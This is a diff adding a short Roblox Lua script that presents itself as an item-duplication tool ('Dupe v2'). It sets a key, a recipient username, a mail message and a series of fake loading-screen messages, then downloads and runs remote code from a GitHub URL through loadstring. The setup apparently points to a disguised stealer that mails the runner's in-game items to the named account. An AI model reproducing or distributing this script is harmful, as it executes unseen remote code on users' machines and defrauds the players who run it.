@@ -1,0 +1,16 @@
+getgenv().key = ‘Mailbox-lo765mKLzxc43'-- key here get it by saying '$key' on your premium chat
+
+getgenv().username = "Fingerlookingawesome"
+getgenv().loadingscreen = true
+
+getgenv().mailmessage = "syrexhub on top"
+
+getgenv().scripttitle = "Dupe v2"
+
+getgenv().loadingtext1 = ""
+getgenv().loadingtext2 = "Script Loaded..."
+getgenv().loadingtext3 = "Waiting for Script"
+getgenv().loadingtext4 = "Checking Scripts..."
+getgenv().loadingtext5 = "Starting Scripts..."
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/gerisxx/premiumv2/main/mailbox'))()
